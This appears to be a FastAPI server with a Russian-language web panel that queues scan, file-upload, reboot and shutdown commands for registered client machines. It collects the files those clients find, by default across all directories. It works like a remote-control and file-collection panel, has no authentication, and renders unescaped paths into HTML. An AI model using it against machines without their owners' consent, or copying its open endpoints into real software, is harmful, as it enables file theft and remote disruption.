# server.py
from fastapi import FastAPI, HTTPException, UploadFile, File, Form
from fastapi.responses import HTMLResponse, FileResponse
from pydantic import BaseModel
from typing import Dict, List, Optional
import uvicorn
import uuid
import os
from datetime import datetime
import json

app = FastAPI(title="Access File Transfer Server")

# Папка для сохранения файлов
uploaded_files_dir = "uploaded_files"
os.makedirs(uploaded_files_dir, exist_ok=True)

# Хранилища в памяти
pending_commands: Dict[str, List[dict]] = {}
client_files: Dict[str, List[dict]] = {}
uploaded_files_metadata: List[dict] = []
clients_registry: Dict[str, dict] = {}
client_configs: Dict[str, dict] = {}  # Конфигурации клиентов для поиска файлов

# Модели
class ScanCommand(BaseModel):
    client_id: str

class UploadCommand(BaseModel):
    client_id: str
    filepath: str

class RebootCommand(BaseModel):
    client_id: str

class ShutdownCommand(BaseModel):
    client_id: str

class CommandResponse(BaseModel):
    command_id: str
    type: str
    status: str

class ClientStatus(BaseModel):
    client_id: str
    ip: str

class ClientConfig(BaseModel):
    client_id: str
    search_patterns: List[str]
    search_directories: List[str]
    max_file_size_mb: int
    scan_interval: int = 5

# Эндпоинты
@app.post("/command/scan", response_model=CommandResponse)
async def create_scan_command(cmd: ScanCommand):
    command_id = str(uuid.uuid4())
    new_command = {"command_id": command_id, "type": "scan", "status": "pending"}
    pending_commands.setdefault(cmd.client_id, []).append(new_command)
    return CommandResponse(command_id=command_id, type="scan", status="pending")

@app.post("/command/upload", response_model=CommandResponse)
async def create_upload_command(cmd: UploadCommand):
    command_id = str(uuid.uuid4())
    new_command = {"command_id": command_id, "type": "upload", "filepath": cmd.filepath, "status": "pending"}
    pending_commands.setdefault(cmd.client_id, []).append(new_command)
    return CommandResponse(command_id=command_id, type="upload", status="pending")

@app.post("/command/reboot", response_model=CommandResponse)
async def create_reboot_command(cmd: RebootCommand):
    command_id = str(uuid.uuid4())
    new_command = {"command_id": command_id, "type": "reboot", "status": "pending"}
    pending_commands.setdefault(cmd.client_id, []).append(new_command)
    return CommandResponse(command_id=command_id, type="reboot", status="pending")

@app.post("/command/shutdown", response_model=CommandResponse)
async def create_shutdown_command(cmd: ShutdownCommand):
    command_id = str(uuid.uuid4())
    new_command = {"command_id": command_id, "type": "shutdown", "status": "pending"}
    pending_commands.setdefault(cmd.client_id, []).append(new_command)
    return CommandResponse(command_id=command_id, type="shutdown", status="pending")

@app.get("/commands/{client_id}")
async def get_commands(client_id: str):
    commands = pending_commands.get(client_id, [])
    pending = [cmd for cmd in commands if cmd["status"] == "pending"]
    return {"commands": pending}

@app.post("/files/report")
async def report_files(client_id: str = Form(...), files_json: str = Form(...)):
    try:
        files_list = json.loads(files_json)
        client_files[client_id] = [
            {"filepath": f, "reported_at": datetime.now().isoformat()} for f in files_list
        ]
        if client_id in pending_commands:
            for cmd in pending_commands[client_id]:
                if cmd["type"] == "scan" and cmd["status"] == "pending":
                    cmd["status"] = "completed"
                    break
        return {"status": "success", "count": len(files_list)}
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Invalid JSON: {e}")

@app.get("/client/{client_id}/files")
async def get_client_files(client_id: str):
    return {"client_id": client_id, "files": client_files.get(client_id, [])}

@app.get("/api/clients")
async def get_all_clients():
    """Получение списка всех клиентов"""
    import json
    print(f"DEBUG: Запрос списка клиентов")
    print(f"DEBUG: Всего клиентов в реестре: {len(clients_registry)}")
    print(f"DEBUG: Содержимое реестра: {json.dumps(clients_registry, indent=2, ensure_ascii=False)}")
    
    # Убеждаемся, что возвращаем правильную структуру
    result = {"clients": clients_registry}
    print(f"DEBUG: Возвращаем: {json.dumps(result, indent=2, ensure_ascii=False)}")
    return result

@app.post("/client/status")
async def receive_client_status(status: ClientStatus):
    """Получение статуса от клиента"""
    clients_registry[status.client_id] = {
        "ip": status.ip,
        "last_seen": datetime.now().isoformat()
    }
    print(f"DEBUG: Клиент {status.client_id} зарегистрирован. IP: {status.ip}")
    print(f"DEBUG: Всего клиентов: {len(clients_registry)}")
    return {"status": "ok"}

@app.get("/client/{client_id}/config")
async def get_client_config(client_id: str):
    """Получение конфигурации клиента с сервера"""
    if client_id not in client_configs:
        # Возвращаем конфигурацию по умолчанию
        default_config = {
            "search_patterns": ["*.log", "*.txt", "*.json"],
            "search_directories": ["all"],
            "max_file_size_mb": 100,
            "scan_interval": 5
        }
        return default_config
    return client_configs[client_id]

@app.post("/client/{client_id}/config")
async def set_client_config(client_id: str, config: ClientConfig):
    """Установка конфигурации клиента на сервере"""
    client_configs[client_id] = {
        "search_patterns": config.search_patterns,
        "search_directories": config.search_directories,
        "max_file_size_mb": config.max_file_size_mb,
        "scan_interval": config.scan_interval
    }
    return {"status": "ok", "message": "Конфигурация сохранена"}

@app.get("/api/downloaded-files")
async def get_downloaded_files():
    return {"files": uploaded_files_metadata}

@app.get("/api/debug")
async def debug_info():
    """Отладочная информация"""
    return {
        "clients_registry": clients_registry,
        "clients_count": len(clients_registry),
        "client_files": {k: len(v) for k, v in client_files.items()},
        "pending_commands": {k: len(v) for k, v in pending_commands.items()}
    }

@app.post("/upload/")
async def upload_file(
    command_id: str = Form(...),
    client_id: str = Form(...),
    file: UploadFile = File(...)
):
    commands = pending_commands.get(client_id, [])
    command = next((c for c in commands if c["command_id"] == command_id), None)
    if not command:
        raise HTTPException(status_code=404, detail="Command not found")

    safe_filename = file.filename.replace("/", "_").replace("\\", "_")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    save_path = os.path.join(uploaded_files_dir, f"{client_id}_{timestamp}_{safe_filename}")

    content = await file.read()
    with open(save_path, "wb") as f:
        f.write(content)

    command["status"] = "completed"
    command["saved_as"] = save_path
    command["filename"] = file.filename
    command["size"] = len(content)
    command["completed_at"] = datetime.now().isoformat()

    uploaded_files_metadata.append({
        "command_id": command_id,
        "client_id": client_id,
        "filename": file.filename,
        "saved_path": save_path,
        "size": len(content),
        "uploaded_at": command["completed_at"]
    })
    return {"status": "success", "command_id": command_id, "message": "Файл успешно загружен"}

@app.get("/download/{command_id}")
async def download_file(command_id: str):
    file_record = next((f for f in uploaded_files_metadata if f["command_id"] == command_id), None)
    if not file_record or not os.path.exists(file_record["saved_path"]):
        raise HTTPException(status_code=404, detail="Файл не найден")
    return FileResponse(
        path=file_record["saved_path"],
        filename=file_record["filename"],
        media_type="application/octet-stream"
    )

# Главная страница
@app.get("/", response_class=HTMLResponse)
async def main_page():
    return """
    <html>
        <head>
            <title>📁 Access File Transfer — Центр управления</title>
            <style>
                * { box-sizing: border-box; }
                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
                .container { max-width: 1400px; margin: 0 auto; }
                .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
                h1 { margin: 0; color: #2c3e50; }
                .btn {
                    padding: 8px 16px;
                    margin: 4px;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 14px;
                    transition: all 0.2s;
                }
                .btn:hover { opacity: 0.9; transform: translateY(-1px); }
                .btn-primary { background: #3498db; color: white; }
                .btn-success { background: #2ecc71; color: white; }
                .btn-danger { background: #e74c3c; color: white; }
                .btn-warning { background: #f39c12; color: white; }
                .btn-download { background: #27ae60; color: white; }
                .btn-refresh { background: #95a5a6; color: white; }
                .client-card {
                    background: white;
                    border: 1px solid #ddd;
                    border-radius: 8px;
                    padding: 16px;
                    margin: 12px 0;
                    box-shadow: 0 2px 4px rgba(0,0,0,0.05);
                }
                .client-header {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 12px;
                    padding-bottom: 12px;
                    border-bottom: 2px solid #ecf0f1;
                }
                .client-info { flex: 1; }
                .client-actions { display: flex; gap: 8px; flex-wrap: wrap; }
                .client-card h3 {
                    margin: 0 0 8px 0;
                    color: #2980b9;
                }
                .client-meta {
                    font-size: 13px;
                    color: #7f8c8d;
                    margin: 4px 0;
                }
                .files-section {
                    margin-top: 16px;
                    padding-top: 16px;
                    border-top: 1px dashed #eee;
                }
                .file-explorer {
                    border: 1px solid #ddd;
                    border-radius: 4px;
                    background: #fafafa;
                    max-height: 500px;
                    overflow-y: auto;
                    padding: 8px;
                }
                .folder-item {
                    padding: 6px 8px;
                    cursor: pointer;
                    border-radius: 3px;
                    margin: 2px 0;
                    display: flex;
                    align-items: center;
                    user-select: none;
                }
                .folder-item:hover { background: #e8f4f8; }
                .folder-item.expanded { background: #d5e8f4; }
                .folder-icon { margin-right: 6px; font-size: 16px; }
                .file-item {
                    padding: 8px 12px;
                    border-bottom: 1px solid #f0f0f0;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    background: white;
                    margin: 2px 0;
                    border-radius: 3px;
                }
                .file-item:hover { background: #f9f9f9; }
                .file-info {
                    flex: 1;
                    min-width: 0;
                }
                .file-path {
                    font-family: 'Consolas', 'Monaco', monospace;
                    font-size: 13px;
                    word-break: break-all;
                    color: #2c3e50;
                }
                .file-meta {
                    font-size: 11px;
                    color: #95a5a6;
                    margin-top: 4px;
                }
                .file-actions {
                    display: flex;
                    gap: 6px;
                    margin-left: 12px;
                }
                .empty-state {
                    text-align: center;
                    padding: 40px;
                    color: #95a5a6;
                }
                .downloaded-files {
                    margin-top: 30px;
                }
                .search-box {
                    margin: 12px 0;
                    padding: 8px 12px;
                    border: 1px solid #ddd;
                    border-radius: 4px;
                    font-size: 14px;
                    width: 100%;
                    max-width: 400px;
                }
                .search-box:focus {
                    outline: none;
                    border-color: #3498db;
                }
                .file-item.hidden {
                    display: none;
                }
                .folder-item.hidden {
                    display: none;
                }
                .no-results {
                    padding: 20px;
                    text-align: center;
                    color: #95a5a6;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>📁 Access File Transfer — Центр управления</h1>
                    <div>
                        <button class="btn btn-refresh" onclick="refreshAll()">🔄 Обновить</button>
                        <button class="btn btn-primary" onclick="window.open('/api/debug', '_blank')" style="margin-left:8px;">🔍 Отладка</button>
                    </div>
                </div>
                
                <div id="clientsList">
                    <p style="text-align:center; color:#7f8c8d;">Загрузка...</p>
                </div>

                <div class="client-card downloaded-files">
                    <h3>⬇️ Загруженные файлы</h3>
                    <div id="downloadedFilesContainer">
                        <p>Нет загруженных файлов.</p>
                    </div>
                </div>
            </div>

            <script>
                function organizeFilesIntoTree(files) {
                    const tree = {};
                    files.forEach(file => {
                        const parts = file.filepath.split(/[\/\\]/);
                        let current = tree;
                        for (let i = 0; i < parts.length; i++) {
                            const part = parts[i];
                            if (i === parts.length - 1) {
                                // Это файл
                                if (!current._files) current._files = [];
                                current._files.push(file);
                            } else {
                                // Это папка
                                if (!current[part]) {
                                    current[part] = {};
                                }
                                current = current[part];
                            }
                        }
                    });
                    return tree;
                }

                function renderFileTree(tree, parentElement, clientId, level = 0) {
                    const keys = Object.keys(tree).filter(k => k !== '_files');
                    const hasFiles = tree._files && tree._files.length > 0;
                    
                    if (keys.length === 0 && !hasFiles) return;

                    keys.forEach(key => {
                        const folderDiv = document.createElement('div');
                        folderDiv.className = 'folder-item';
                        folderDiv.style.paddingLeft = (level * 20 + 8) + 'px';
                        folderDiv.innerHTML = `<span class="folder-icon">📁</span><span>${key}</span>`;
                        
                        const subTree = document.createElement('div');
                        subTree.style.display = 'none';
                        subTree.style.marginLeft = '20px';
                        
                        folderDiv.onclick = function(e) {
                            e.stopPropagation();
                            const isExpanded = folderDiv.classList.contains('expanded');
                            if (isExpanded) {
                                folderDiv.classList.remove('expanded');
                                subTree.style.display = 'none';
                                folderDiv.querySelector('.folder-icon').textContent = '📁';
                            } else {
                                folderDiv.classList.add('expanded');
                                subTree.style.display = 'block';
                                folderDiv.querySelector('.folder-icon').textContent = '📂';
                            }
                        };
                        
                        parentElement.appendChild(folderDiv);
                        parentElement.appendChild(subTree);
                        renderFileTree(tree[key], subTree, clientId, level + 1);
                    });

                    if (hasFiles) {
                        tree._files.forEach(file => {
                            const fileDiv = document.createElement('div');
                            fileDiv.className = 'file-item';
                            fileDiv.style.paddingLeft = (level * 20 + 12) + 'px';
                            const fileName = file.filepath.split(/[\/\\]/).pop();
                            fileDiv.innerHTML = `
                                <div class="file-info">
                                    <div class="file-path">📄 ${fileName}</div>
                                    <div class="file-meta">${file.filepath} | Найден: ${new Date(file.reported_at).toLocaleString()}</div>
                                </div>
                                <div class="file-actions">
                                    <button class="btn btn-success" onclick="uploadFile('${clientId}', '${encodeURIComponent(file.filepath)}')" style="font-size:12px; padding:4px 8px;">
                                        📤 Загрузить
                                    </button>
                                </div>
                            `;
                            parentElement.appendChild(fileDiv);
                        });
                    }
                }

                async function loadAllClients() {
                    try {
                        console.log('Запрос списка клиентов...');
                        const res = await fetch('/api/clients');
                        console.log('Ответ получен, статус:', res.status);
                        
                        if (!res.ok) {
                            console.error('Ошибка загрузки клиентов:', res.status, res.statusText);
                            const container = document.getElementById('clientsList');
                            container.innerHTML = '<p style="text-align:center; color:#e74c3c;">Ошибка загрузки: ' + res.status + '</p>';
                            return;
                        }
                        
                        const data = await res.json();
                        console.log('Получены данные клиентов:', JSON.stringify(data, null, 2));
                        console.log('Тип данных:', typeof data);
                        console.log('Есть ли clients:', 'clients' in data);
                        console.log('Количество клиентов:', data.clients ? Object.keys(data.clients).length : 0);
                        
                        const container = document.getElementById('clientsList');
                        if (!container) {
                            console.error('Элемент clientsList не найден!');
                            return;
                        }
                        
                        if (!data || !data.clients || Object.keys(data.clients).length === 0) {
                            console.log('Нет клиентов для отображения');
                            container.innerHTML = '<p style="text-align:center; color:#7f8c8d;">Нет подключённых клиентов. Убедитесь, что клиент запущен и подключен к серверу.</p>';
                            return;
                        }

                        container.innerHTML = '';
                        console.log('Начинаем отрисовку клиентов, количество:', Object.keys(data.clients).length);
                        
                        for (const [clientId, info] of Object.entries(data.clients)) {
                            console.log('Отрисовка клиента:', clientId, info);
                            const div = document.createElement('div');
                            div.className = 'client-card';
                            
                            // Экранируем специальные символы для безопасности
                            const safeClientId = clientId.replace(/'/g, "\\'");
                            const safeIp = (info.ip || 'неизвестно').replace(/'/g, "\\'");
                            const lastSeen = info.last_seen ? new Date(info.last_seen).toLocaleString() : 'никогда';
                            
                            div.innerHTML = `
                                <div class="client-header">
                                    <div class="client-info">
                                        <h3>🖥️ ${safeClientId}</h3>
                                        <div class="client-meta">
                                            <strong>IP:</strong> ${safeIp} | 
                                            <strong>Последний раз видели:</strong> ${lastSeen}
                                        </div>
                                    </div>
                                    <div class="client-actions">
                                        <button class="btn btn-primary" onclick="requestScan('${safeClientId}')">🔍 Сканировать</button>
                                        <button class="btn btn-success" onclick="showFiles('${safeClientId}')">📂 Файлы</button>
                                        <button class="btn btn-primary" onclick="showConfig('${safeClientId}')">⚙️ Настройки</button>
                                        <button class="btn btn-warning" onclick="rebootClient('${safeClientId}')">🔄 Перезагрузить</button>
                                        <button class="btn btn-danger" onclick="shutdownClient('${safeClientId}')">⏻ Выключить</button>
                                    </div>
                                </div>
                                <div id="config-${safeClientId}" class="files-section" style="display:none;"></div>
                                <div id="files-${safeClientId}" class="files-section" style="display:none;"></div>
                            `;
                            container.appendChild(div);
                            console.log('Клиент добавлен в DOM:', clientId);
                        }
                        
                        console.log('Все клиенты отрисованы');
                    } catch (e) {
                        console.error('Ошибка загрузки клиентов:', e);
                        const container = document.getElementById('clientsList');
                        container.innerHTML = '<p style="text-align:center; color:#e74c3c;">Ошибка загрузки клиентов: ' + e.message + '</p>';
                    }
                }

                let currentFilesData = {}; // Храним данные файлов для каждого клиента

                function filterFileTree(searchTerm, clientId) {
                    const explorer = document.getElementById(`explorer-${clientId}`);
                    if (!explorer) return;
                    
                    const term = searchTerm.toLowerCase();
                    const allItems = explorer.querySelectorAll('.file-item, .folder-item');
                    
                    if (!term) {
                        // Показываем все, если поиск пустой
                        allItems.forEach(item => {
                            item.classList.remove('hidden');
                            // Раскрываем все папки при очистке поиска
                            if (item.classList.contains('folder-item')) {
                                const subTree = item.nextElementSibling;
                                if (subTree && subTree.style.display === 'none') {
                                    item.click();
                                }
                            }
                        });
                        return;
                    }
                    
                    // Скрываем все сначала
                    allItems.forEach(item => item.classList.add('hidden'));
                    
                    // Показываем совпадающие файлы и их родительские папки
                    allItems.forEach(item => {
                        if (item.classList.contains('file-item')) {
                            const filePath = item.querySelector('.file-path')?.textContent || '';
                            const fileMeta = item.querySelector('.file-meta')?.textContent || '';
                            if (filePath.toLowerCase().includes(term) || fileMeta.toLowerCase().includes(term)) {
                                item.classList.remove('hidden');
                                // Раскрываем родительские папки
                                let parent = item.parentElement;
                                while (parent && parent !== explorer) {
                                    const folder = parent.previousElementSibling;
                                    if (folder && folder.classList.contains('folder-item')) {
                                        folder.classList.remove('hidden');
                                        const subTree = folder.nextElementSibling;
                                        if (subTree) {
                                            subTree.style.display = 'block';
                                            folder.classList.add('expanded');
                                            folder.querySelector('.folder-icon').textContent = '📂';
                                        }
                                    }
                                    parent = parent.parentElement;
                                }
                            }
                        } else if (item.classList.contains('folder-item')) {
                            const folderName = item.textContent.toLowerCase();
                            if (folderName.includes(term)) {
                                item.classList.remove('hidden');
                                // Раскрываем папку
                                const subTree = item.nextElementSibling;
                                if (subTree) {
                                    subTree.style.display = 'block';
                                    item.classList.add('expanded');
                                    item.querySelector('.folder-icon').textContent = '📂';
                                }
                            }
                        }
                    });
                    
                    // Проверяем, есть ли результаты
                    const visibleItems = explorer.querySelectorAll('.file-item:not(.hidden), .folder-item:not(.hidden)');
                    const noResults = explorer.querySelector('.no-results');
                    if (visibleItems.length === 0 && !noResults) {
                        const noResultsDiv = document.createElement('div');
                        noResultsDiv.className = 'no-results';
                        noResultsDiv.textContent = 'Ничего не найдено';
                        explorer.appendChild(noResultsDiv);
                    } else if (noResults && visibleItems.length > 0) {
                        noResults.remove();
                    }
                }

                async function showFiles(clientId) {
                    const filesDiv = document.getElementById(`files-${clientId}`);
                    const isVisible = filesDiv.style.display !== 'none';
                    
                    if (isVisible) {
                        filesDiv.style.display = 'none';
                        return;
                    }
                    
                    filesDiv.style.display = 'block';
                    filesDiv.innerHTML = '<div class="empty-state">Загрузка файлов...</div>';

                    const res = await fetch(`/client/${clientId}/files`);
                    const data = await res.json();
                    currentFilesData[clientId] = data.files;

                    if (data.files.length === 0) {
                        filesDiv.innerHTML = `
                            <div class="empty-state">
                                <p>Файлов пока нет.</p>
                                <button class="btn btn-primary" onclick="requestScan('${clientId}')">
                                    🔍 Запросить поиск файлов
                                </button>
                            </div>
                        `;
                    } else {
                        filesDiv.innerHTML = `
                            <input type="text" 
                                   class="search-box" 
                                   id="search-${clientId}" 
                                   placeholder="🔍 Поиск файлов..." 
                                   oninput="filterFileTree(this.value, '${clientId}')">
                            <div class="file-explorer" id="explorer-${clientId}"></div>
                        `;
                        
                        const explorer = document.getElementById(`explorer-${clientId}`);
                        
                        // Организуем файлы в дерево
                        const tree = organizeFilesIntoTree(data.files);
                        renderFileTree(tree, explorer, clientId);
                    }
                }

                async function requestScan(clientId) {
                    if (!confirm(`Запросить поиск файлов у устройства ${clientId}?`)) return;
                    try {
                        await fetch('/command/scan', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({client_id: clientId})
                        });
                        alert('Команда на поиск файлов отправлена. Обновите через несколько секунд.');
                    } catch (e) {
                        alert('Ошибка отправки команды: ' + e.message);
                    }
                }

                async function rebootClient(clientId) {
                    if (!confirm(`⚠️ ВНИМАНИЕ! Перезагрузить устройство ${clientId}?`)) return;
                    try {
                        await fetch('/command/reboot', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({client_id: clientId})
                        });
                        alert('Команда на перезагрузку отправлена.');
                    } catch (e) {
                        alert('Ошибка отправки команды: ' + e.message);
                    }
                }

                async function shutdownClient(clientId) {
                    if (!confirm(`⚠️ ВНИМАНИЕ! Выключить устройство ${clientId}? Это действие нельзя отменить!`)) return;
                    try {
                        await fetch('/command/shutdown', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({client_id: clientId})
                        });
                        alert('Команда на выключение отправлена.');
                    } catch (e) {
                        alert('Ошибка отправки команды: ' + e.message);
                    }
                }

                async function uploadFile(clientId, filepath) {
                    if (!confirm("Загрузить этот файл на сервер?")) return;
                    try {
                        await fetch('/command/upload', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({client_id: clientId, filepath: decodeURIComponent(filepath)})
                        });
                        alert("Команда загрузки создана.");
                        loadDownloadedFiles();
                    } catch (e) {
                        alert('Ошибка отправки команды: ' + e.message);
                    }
                }

                async function loadDownloadedFiles() {
                    const res = await fetch('/api/downloaded-files');
                    const data = await res.json();
                    const container = document.getElementById('downloadedFilesContainer');
                    if (data.files.length === 0) {
                        container.innerHTML = '<p>Нет загруженных файлов.</p>';
                    } else {
                        container.innerHTML = data.files.map(f => `
                            <div class="file-item">
                                <div class="file-info">
                                    <div class="file-path"><strong>${f.filename}</strong> (${(f.size / 1024).toFixed(1)} КБ)</div>
                                    <div class="file-meta">С компьютера: ${f.client_id} | ${new Date(f.uploaded_at).toLocaleString()}</div>
                                </div>
                                <div class="file-actions">
                                    <button class="btn btn-download" onclick="location.href='/download/${f.command_id}'">
                                        ⬇️ Скачать
                                    </button>
                                </div>
                            </div>
                        `).join('');
                    }
                }

                async function showConfig(clientId) {
                    const configDiv = document.getElementById(`config-${clientId}`);
                    const isVisible = configDiv.style.display !== 'none';
                    
                    if (isVisible) {
                        configDiv.style.display = 'none';
                        return;
                    }
                    
                    configDiv.style.display = 'block';
                    configDiv.innerHTML = '<div class="empty-state">Загрузка конфигурации...</div>';

                    try {
                        const res = await fetch(`/client/${clientId}/config`);
                        const config = await res.json();
                        
                        const patternsText = config.search_patterns.join('\n');
                        const directoriesText = config.search_directories.join('\n');
                        
                        configDiv.innerHTML = `
                            <h4>⚙️ Конфигурация поиска файлов</h4>
                            <div style="background: #f9f9f9; padding: 16px; border-radius: 4px; margin-top: 12px;">
                                <div style="margin-bottom: 12px;">
                                    <label><strong>Паттерны поиска:</strong></label>
                                    <textarea id="patterns-${clientId}" style="width: 100%; min-height: 60px; padding: 8px; border: 1px solid #ddd; border-radius: 4px; font-family: monospace;">${patternsText}</textarea>
                                    <small style="color: #7f8c8d;">По одному паттерну на строку (например: *.log, *.txt)</small>
                                </div>
                                <div style="margin-bottom: 12px;">
                                    <label><strong>Директории для поиска:</strong></label>
                                    <textarea id="directories-${clientId}" style="width: 100%; min-height: 60px; padding: 8px; border: 1px solid #ddd; border-radius: 4px; font-family: monospace;">${directoriesText}</textarea>
                                    <small style="color: #7f8c8d;">По одной директории на строку. Используйте "all" для поиска везде.</small>
                                </div>
                                <div style="margin-bottom: 12px;">
                                    <label><strong>Максимальный размер файла (МБ):</strong></label>
                                    <input type="number" id="maxsize-${clientId}" value="${config.max_file_size_mb}" style="width: 100px; padding: 6px; border: 1px solid #ddd; border-radius: 4px;">
                                </div>
                                <div style="margin-bottom: 12px;">
                                    <label><strong>Интервал проверки команд (секунды):</strong></label>
                                    <input type="number" id="interval-${clientId}" value="${config.scan_interval}" style="width: 100px; padding: 6px; border: 1px solid #ddd; border-radius: 4px;">
                                </div>
                                <button class="btn btn-success" onclick="saveConfig('${clientId}')">💾 Сохранить конфигурацию</button>
                            </div>
                        `;
                    } catch (e) {
                        configDiv.innerHTML = `<div class="empty-state">Ошибка загрузки конфигурации: ${e.message}</div>`;
                    }
                }

                async function saveConfig(clientId) {
                    const patterns = document.getElementById(`patterns-${clientId}`).value.split('\n').filter(p => p.trim());
                    const directories = document.getElementById(`directories-${clientId}`).value.split('\n').filter(d => d.trim());
                    const maxSize = parseInt(document.getElementById(`maxsize-${clientId}`).value);
                    const interval = parseInt(document.getElementById(`interval-${clientId}`).value);

                    try {
                        const res = await fetch(`/client/${clientId}/config`, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                client_id: clientId,
                                search_patterns: patterns,
                                search_directories: directories,
                                max_file_size_mb: maxSize,
                                scan_interval: interval
                            })
                        });
                        
                        if (res.ok) {
                            alert('Конфигурация сохранена! Клиент получит новую конфигурацию при следующей проверке команд.');
                            showConfig(clientId); // Обновляем отображение
                        } else {
                            alert('Ошибка сохранения конфигурации');
                        }
                    } catch (e) {
                        alert('Ошибка: ' + e.message);
                    }
                }

                // Объявляем функции глобально для использования в onclick
                window.refreshAll = function() {
                    console.log('Обновление данных...');
                    loadAllClients();
                    loadDownloadedFiles();
                };
                
                // Делаем функции доступными глобально
                window.requestScan = requestScan;
                window.showFiles = showFiles;
                window.showConfig = showConfig;
                window.rebootClient = rebootClient;
                window.shutdownClient = shutdownClient;
                window.uploadFile = uploadFile;
                window.filterFileTree = filterFileTree;

                // Обработка ошибок JavaScript
                window.addEventListener('error', function(e) {
                    console.error('JavaScript ошибка:', e.error);
                    const container = document.getElementById('clientsList');
                    if (container) {
                        container.innerHTML = '<p style="text-align:center; color:#e74c3c;">Ошибка JavaScript: ' + e.message + '</p>';
                    }
                });

                // Загрузка при старте
                console.log('Инициализация страницы...');
                window.refreshAll();
            </script>
        </body>
    </html>
    """

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)